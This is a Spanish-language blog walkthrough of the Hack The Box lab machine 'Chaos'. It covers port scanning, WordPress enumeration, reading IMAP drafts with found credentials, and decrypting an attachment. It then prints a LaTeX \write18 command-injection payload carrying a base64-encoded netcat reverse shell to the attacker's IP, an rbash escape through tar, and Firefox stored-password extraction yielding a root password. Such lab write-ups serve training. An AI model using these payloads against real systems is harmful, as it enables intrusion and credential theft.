<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Chaos :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/chaos/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Chaos :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/chaos/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Chaos :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10." />
<meta property="og:url" content="https://sckull.github.io/posts/chaos/" />
<meta property="og:site_name" content="Hack The Box - Chaos" />
<meta property="og:image" content="https://sckull.github.io/image/htb/chaos/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Chaos",
        "headline" : "Hack The Box - Chaos",
        "description" : "MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-05-25 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-05-25 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/chaos/",
        "wordCount" : "1186",
        "keywords" : [ "hackthebox","linux","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-05-25 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Chaos</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Saturday, May 25, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 6 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/chaos/../../image/htb/chaos/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan">MASSCAN</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#wfuzz">WFUZZ</a>
<ul>
<li><a href="#wp-wordpress">/wp/wordpress</a></li>
</ul></li>
<li><a href="#wpscan-users">WPSCAN - Users</a></li>
<li><a href="#http-puerto-10000">HTTP - PUERTO 10000</a></li>
<li><a href="#imap-puerto-993">IMAP - Puerto 993</a></li>
<li><a href="#rce-pdftext-latex">RCE - pdfTEXT [LaTex]</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<hr />

<h2 id="masscan">MASSCAN</h2>

<p>Escaneo de puertos udp/tcp.</p>

<pre><code class="language-bash">root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0

Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 10000/tcp on 10.10.10.120                                 
Discovered open port 10000/udp on 10.10.10.120                                 
Discovered open port 110/tcp on 10.10.10.120                                   
Discovered open port 143/tcp on 10.10.10.120                                   
Discovered open port 995/tcp on 10.10.10.120                                   
Discovered open port 993/tcp on 10.10.10.120
</code></pre>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos con nmap.</p>

<pre><code class="language-bash">Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for 10.10.10.120
Host is up (0.093s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.15 seconds
</code></pre>

<h2 id="http">HTTP</h2>

<p>Al visitar la pagina en el puerto 80 nos muestra un mensaje <code>Direct IP not allowed</code>.
<img src="../../image/htb/chaos/Screenshot_20190523_131403.png" alt="image" /></p>

<h2 id="wfuzz">WFUZZ</h2>

<p>Escaneo de directorios con WFUZZ y el wordlist <code>common.txt</code>, nos encontramos con un directorio <code>/wp</code>.</p>

<pre><code class="language-bash">Target: http://10.10.10.120/FUZZ
Total requests: 4588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200      1 L	       5 W	     73 Ch	  &quot;&quot;
001994:  C=200      1 L	       5 W	     73 Ch	  &quot;index.html&quot;
002119:  C=301      9 L	      28 W	    317 Ch	  &quot;javascript&quot;
003562:  C=403     11 L	      32 W	    300 Ch	  &quot;server-status&quot;
004458:  C=301      9 L	      28 W	    309 Ch	  &quot;wp&quot;
</code></pre>

<p>Realizamos un escaneo por segunda vez al directorio <code>/wp</code>.</p>

<pre><code class="language-bash">Target: http://10.10.10.120/wp/FUZZ
Total requests: 4588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     16 L	      60 W	    933 Ch	  &quot;&quot;
004445:  C=301      9 L	      28 W	    319 Ch	  &quot;wordpress&quot;
</code></pre>

<h3 id="wp-wordpress">/wp/wordpress</h3>

<p>Al visitar la ruta <code>http://10.10.10.120/wp/wordpress/</code> nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.</p>

<p>Obtuvimos la contraseña por medio de la herramienta <code>WPSCAN</code> haciendo un escaneo a la pagina, la contraseña con la que pudimos desbloquear el post fue un usuario que encontramos con WPSCAN.</p>

<h2 id="wpscan-users">WPSCAN - Users</h2>

<p><img src="../../image/htb/chaos/Screenshot_20190523_133114.png" alt="image" /></p>

<p>Credenciales:</p>

<pre><code class="language-text">username – ayush
password – jiujitsu
</code></pre>

<p>Las credenciales que nos muestran son las de el webmail.</p>

<h2 id="http-puerto-10000">HTTP - PUERTO 10000</h2>

<p>Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo <code>/etc/hosts</code> con la IP de la maquina para averiguar lo que obtenemos en ese dominio.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_135937.png" alt="image" /></p>

<p><code>[/etc/hosts]</code></p>

<pre><code class="language-text">10.10.10.120	chaos
</code></pre>

<p>Al visitar <code>https://chaos:10000/</code> nos muestra el weblogin al cual se refiere el mensaje de las credenciales.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_145204.png" alt="image" /></p>

<p>Igualmente podemos acceder direcatamente con la IP.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_140435.png" alt="image" /></p>

<p>Al intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_140604.png" alt="image" /></p>

<h2 id="imap-puerto-993">IMAP - Puerto 993</h2>

<p>Utilizamos openssl para poder conectarnos con el <code>puerto 993</code> y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.</p>

<p>En la carpeta o seccion de <code>Drafts</code> encontramos un correo existente aun.
<img src="../../image/htb/chaos/Screenshot_20190523_141221.png" alt="image" /></p>

<p>Al leer el correo nos muestra un mensaje que nos habla sobre dos archivos adjuntos al correo.
<img src="../../image/htb/chaos/Screenshot_20190523_141409.png" alt="image" /></p>

<pre><code class="language-vim">Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
</code></pre>

<p>Primer archivo:
<img src="../../image/htb/chaos/Screenshot_20190523_141653.png" alt="image" /></p>

<pre><code class="language-vim">MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
</code></pre>

<p>Segundo archivo:
<img src="../../image/htb/chaos/Screenshot_20190523_141724.png" alt="image" /></p>

<pre><code class="language-vim">ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBvdXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdldHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikKCiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVua3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgogICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5rKSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdlc3QoKQoK
</code></pre>

<p>Comandos Utilizados:</p>

<pre><code class="language-bash">openssl s_client -connect 10.10.10.120:993
a login ayush jiujitsu
a select Drafts
UID FETCH 1 (BODY[0])
UID FETCH 1 (BODY[2]) &lt;-- Lectura del primer archivo
UID FETCH 1 (BODY[3]) &lt;-- Lectura del segundo archivo
</code></pre>

<p>El primer archivo pertenece a <code>enmsg.txt</code> y el segundo al archivo que encriptó <code>enmsg.txt</code>.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_142003.png" alt="image" /></p>

<p>Ahora que tenemos el archivo de encriptacion podemos escribir algunas funciones para poder desencriptar el archivo.</p>

<pre><code class="language-python">import os, random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def decrypt(key, filename):
	chunksize = 64*1024
	outputFile = 'dec'
	
	with open(filename, 'rb') as infile:
		filesize = long(infile.read(16))
		IV = infile.read(16)

		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))
			outfile.truncate(filesize)


def getKey(password):
	hasher = SHA256.new(password)
	return hasher.digest()

def Main():
	filename = '/path/to/file/file_enc'
	password = 'sahay'
	decrypt(getKey(password), filename)
	print(&quot;Done.&quot;)
	
if __name__ == '__main__':
	Main()
</code></pre>

<p>Al ejecutar nuestro escript nos muestra un mensaje en base64 este mismo lo decodificamos y nos muestra un segundo mensaje que nos habla de un servicio de pdf y una url donde este se encuentra.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_142646.png" alt="image" /></p>

<pre><code class="language-vim">Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
</code></pre>

<p>Agregamos el nuevo dominio a nuestro archivo <code>/etc/hosts</code>.</p>

<p><code>[/etc/hosts]</code></p>

<pre><code class="language-vim">10.10.10.120	chaos.htb
</code></pre>

<h2 id="rce-pdftext-latex">RCE - pdfTEXT [LaTex]</h2>

<p>Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de <code>pdfTEXT</code>. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en <code>LaTex</code>, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.</p>

<p>INFO =&gt; <a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a></p>

<p>Utilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template <code>test3</code>:</p>

<p>Payload:</p>

<pre><code class="language-vim">\immediate\write18{#ComandoAqui}
</code></pre>

<p>Comando:</p>

<pre><code class="language-bash">nslookup sckull.htb 10.10.13.27
</code></pre>

<p>Responder:
<img src="../../image/htb/chaos/Screenshot_20190523_150504.png" alt="image" /></p>

<p>Ahora que tenemos un &lsquo;pequeño&rsquo; acceso mediante ejecucion de comandos, vamos a descargar un archivo que contiene una shell inversa para ejecutarlo y obtener acceso.</p>

<p>Shell:</p>

<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.13.27 7878 &gt;/tmp/f
</code></pre>

<p>Codificamos a base64:</p>

<pre><code class="language-bash">cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==
</code></pre>

<p>Payload:</p>

<pre><code class="language-vim">\immediate\write18{echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==|base64 -d &gt; shell.sh &amp;&amp; sh shell.sh}
</code></pre>

<p>Al enviar este mensaje la maquina decodifica nuestra shell y la agrega a un archivo (<code>shell.sh</code>) luego de esto la ejecuta y obtenemos nuestra shell como usuario <code>www-data</code>.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_151537.png" alt="image" /></p>

<p>Actualizamos nuestra shell con python, al intentar ingresar al directorio de ayush nos dice permiso denegado, anteriormente encontramos una contraseña para <code>ayush</code> utilizamos la misma para poder escalar a ese usuario mediante el comando <code>su</code>, pero al intentar ingresar a su carpeta principal nos muestra que cd esta restringido.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_151821.png" alt="image" /></p>

<p>Para poder escapar este mensaje o rbash utilizamos <code>tar</code>:</p>

<pre><code class="language-bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
</code></pre>

<p>Tambien agregamos a la variable <code>PATH</code>:</p>

<pre><code class="language-bash">export PATH=/usr/bin:/bin
</code></pre>

<p>Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera <code>user.txt</code>.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_152137_user.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Hicimos una pequeña enumeracion en los directorios de ayus y encontramos una carpeta de <code>.mozilla</code> que pertenece a el navegador <code>firefox</code>, revisamos los archivos que contiene esta carpeta y encontramos el archivo <code>login.json</code> que almacena las contraseñas de firefox.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_152619.png" alt="image" /></p>

<pre><code class="language-json">{
   &quot;nextId&quot;:3,
   &quot;logins&quot;:[
      {
         &quot;id&quot;:2,
         &quot;hostname&quot;:&quot;https://chaos.htb:10000&quot;,
         &quot;httpRealm&quot;:null,
         &quot;formSubmitURL&quot;:&quot;https://chaos.htb:10000&quot;,
         &quot;usernameField&quot;:&quot;user&quot;,
         &quot;passwordField&quot;:&quot;pass&quot;,
         &quot;encryptedUsername&quot;:&quot;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==&quot;,
         &quot;encryptedPassword&quot;:&quot;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb&quot;,
         &quot;guid&quot;:&quot;{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}&quot;,
         &quot;encType&quot;:1,
         &quot;timeCreated&quot;:1540642202692,
         &quot;timeLastUsed&quot;:1540642202692,
         &quot;timePasswordChanged&quot;:1540642202692,
         &quot;timesUsed&quot;:1
      }
   ],
   &quot;disabledHosts&quot;:[

   ],
   &quot;version&quot;:2
}
</code></pre>

<p>Para poder obtener el usuario y contraseña de este archivo utilizamos firefox_decrypt [<a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a>], lo descargamos en la maquina y lo ejecutamos, al ejecutarlo nos pide la contraseña para el usuario <code>ayush</code> la ingresamos (<code>jiujitsu</code>), luego de eso nos muestra el usuario y contraseña en ese archivo.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_153148.png" alt="image" /></p>

<pre><code class="language-vim">Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
</code></pre>

<p>Escalamos con el usuario <code>root</code> y contraseña, obteniendo privilegios root y nuestra bandera <code>root.txt</code>.</p>

<p><img src="../../image/htb/chaos/Screenshot_20190523_153328_root.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/help/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Help</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/conceal/">
                <span class="button__text">Hack The Box - Conceal</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
